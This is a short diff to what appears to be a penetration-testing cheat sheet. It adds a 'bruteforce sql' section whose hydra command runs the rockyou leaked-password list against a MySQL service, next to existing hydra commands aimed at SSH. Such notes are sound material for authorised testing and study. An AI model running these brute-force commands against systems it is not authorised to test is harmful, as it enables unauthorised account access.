@@ -21,3 +21,9 @@ hydra -l <username> -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.tx
 ```
 hydra -L pot-user.txt -P pot-password.txt "$rhost" -t 4 ssh
 ```
+
+# bruteforce sql
+
+```bash
+hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt $rhost mysql
+```
